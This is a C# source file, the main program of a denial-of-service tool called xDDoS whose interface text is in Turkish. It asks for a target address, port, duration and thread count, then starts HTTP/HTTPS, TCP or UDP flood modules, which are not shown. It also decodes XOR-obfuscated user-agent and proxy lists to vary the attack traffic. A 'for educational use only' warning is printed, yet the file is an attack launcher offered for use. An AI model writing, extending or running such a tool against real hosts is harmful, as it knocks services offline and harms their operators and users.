using Spectre.Console;
using System;
using xDDoS.Modules;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;
using System.IO;

namespace xDDoS
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                // Modern başlık paneli
                AnsiConsole.Write(new Panel(
                    new Markup("[bold yellow]xDDoS - Eğitim Amaçlı DDoS Aracı[/]")
                )
                .Header("[bold blue]xDDoS[/]", Justify.Center)
                .Border(BoxBorder.Double)
                .BorderStyle(new Style(Color.Aqua))
                .Padding(1,1,1,1)
                .Expand());

                // Yasal uyarı kutusu
                AnsiConsole.Write(new Panel(
                    new Markup("[red]UYARI: Bu aracı yalnızca eğitim ve test amaçlı kullanın! Gerçek saldırılar yasalara aykırıdır ve sorumluluk size aittir.[/]")
                )
                .Header("[bold red]YASAL UYARI[/]", Justify.Center)
                .Border(BoxBorder.Rounded)
                .BorderStyle(new Style(Color.Red))
                .Padding(1,1,1,1)
                .Expand());

                AnsiConsole.MarkupLine("[bold cyan]Hedef adresi giriniz (örn: https://site.com):[/]");
                string hedef = Console.ReadLine();
                if (string.IsNullOrWhiteSpace(hedef))
                {
                    AnsiConsole.MarkupLine("[bold red]Hata:[/] Hedef adres boş olamaz!");
                    continue;
                }

                AnsiConsole.MarkupLine("[bold cyan]Port numarasını giriniz (örn: 80):[/]");
                if (!int.TryParse(Console.ReadLine(), out int port) || port <= 0 || port > 65535)
                {
                    AnsiConsole.MarkupLine("[bold red]Hata:[/] Geçerli bir port numarası giriniz!");
                    continue;
                }

                AnsiConsole.MarkupLine("[bold cyan]Saldırı süresini giriniz (saniye):[/]");
                if (!int.TryParse(Console.ReadLine(), out int sure) || sure <= 0)
                {
                    AnsiConsole.MarkupLine("[bold red]Hata:[/] Geçerli bir süre giriniz!");
                    continue;
                }

                AnsiConsole.MarkupLine("[bold cyan]Thread (eşzamanlı istek) sayısını giriniz (örn: 10):[/]");
                if (!int.TryParse(Console.ReadLine(), out int threadSayisi) || threadSayisi <= 0)
                {
                    AnsiConsole.MarkupLine("[bold red]Hata:[/] Geçerli bir thread sayısı giriniz!");
                    continue;
                }

                // User-Agent, Referer ve Proxy desteği için kullanıcıdan veri al
                List<string> userAgents = new();
                List<string> referers = new();
                List<string> proxies = new();
                string postData = "";

                // Obfuscateli dosyaları çözmek için anahtar
                byte[] obfKey = System.Text.Encoding.UTF8.GetBytes("supersecretkey123");

                // User-Agent dosyası obfuscateli ise oku ve çöz
                if (File.Exists("ua"))
                {
                    var obfData = File.ReadAllBytes("ua");
                    var plain = ComplexXor(obfData, obfKey);
                    userAgents = System.Text.Encoding.UTF8.GetString(plain).Split(new[] { "\r\n", "\n", "\r" }, StringSplitOptions.RemoveEmptyEntries).ToList();
                }
                // HTTP dosyası obfuscateli ise oku ve çöz (örnek: http)
                if (File.Exists("http"))
                {
                    var obfData = File.ReadAllBytes("http");
                    var plain = ComplexXor(obfData, obfKey);
                    referers = System.Text.Encoding.UTF8.GetString(plain).Split(new[] { "\r\n", "\n", "\r" }, StringSplitOptions.RemoveEmptyEntries).ToList();
                    proxies = referers; // http dosyasını proxy olarak da kullan
                }

                if (AnsiConsole.Confirm("[bold cyan]HTTP POST Flood için veri eklemek ister misiniz?[/]", false))
                {
                    AnsiConsole.MarkupLine("[grey]POST verisini girin (örn: test=1&foo=bar):[/]");
                    postData = Console.ReadLine();
                }

                var modSecim = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                        .Title("[bold cyan]Mod seçiniz:[/]")
                        .AddChoices(new[] { "HTTP/HTTPS Flood", "TCP Flood", "UDP Flood" })
                );

                switch (modSecim)
                {
                    case "HTTP/HTTPS Flood":
                        AnsiConsole.MarkupLine("[bold green]HTTP/HTTPS Flood başlatılıyor...[/]");
                        Task.WaitAll(HttpFlood.Run(hedef, sure, threadSayisi));
                        break;
                    case "TCP Flood":
                        AnsiConsole.MarkupLine("[bold green]TCP Flood başlatılıyor...[/]");
                        Task.WaitAll(TcpFlood.Run(hedef, port, sure, threadSayisi));
                        break;
                    case "UDP Flood":
                        AnsiConsole.MarkupLine("[bold green]UDP Flood başlatılıyor...[/]");
                        Task.WaitAll(UdpFlood.Run(hedef, port, sure, threadSayisi));
                        break;
                    default:
                        AnsiConsole.MarkupLine("[bold red]Hata:[/] Geçersiz mod seçimi!");
                        break;
                }
                // Saldırıdan sonra tekrar menüye dön
                AnsiConsole.MarkupLine("[bold yellow]Ana menüye dönülüyor...[/]");
            }
        }

        // Obfuscater.py ile uyumlu XOR + key rotasyon fonksiyonu
        static byte[] ComplexXor(byte[] data, byte[] key)
        {
            int keyLen = key.Length;
            byte[] result = new byte[data.Length];
            byte[] keyBytes = (byte[])key.Clone();
            for (int i = 0; i < data.Length; i++)
            {
                byte k = keyBytes[i % keyLen];
                result[i] = (byte)(data[i] ^ k);
                // Anahtarı karmaşıklaştır (1 bit sola döndür)
                keyBytes[i % keyLen] = (byte)(((k << 1) | (k >> 7)) & 0xFF);
            }
            return result;
        }
    }
} 